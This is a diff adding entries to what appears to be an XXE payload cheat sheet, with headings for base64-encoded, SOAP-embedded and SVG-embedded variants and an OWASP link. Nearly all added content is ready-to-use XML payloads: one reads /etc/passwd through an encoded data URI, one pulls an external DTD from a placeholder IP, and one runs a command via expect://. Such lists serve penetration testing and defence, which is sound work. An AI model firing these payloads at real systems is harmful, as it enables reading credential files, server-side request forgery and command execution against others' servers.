@@ -127,6 +127,30 @@ There are various types of XXE attacks:
 +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
 ```
 
+###### XXE: Base64 Encoded
+
+```
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+```
+
+###### XXE: XXE inside SOAP Example
+
+```
+<soap:Body>
+  <foo>
+    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
+  </foo>
+</soap:Body>
+```
+
+###### XXE: XXE inside SVG
+
+```
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://ls"></image>
+</svg>
+```
+
 #### References :
  
 👉 [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
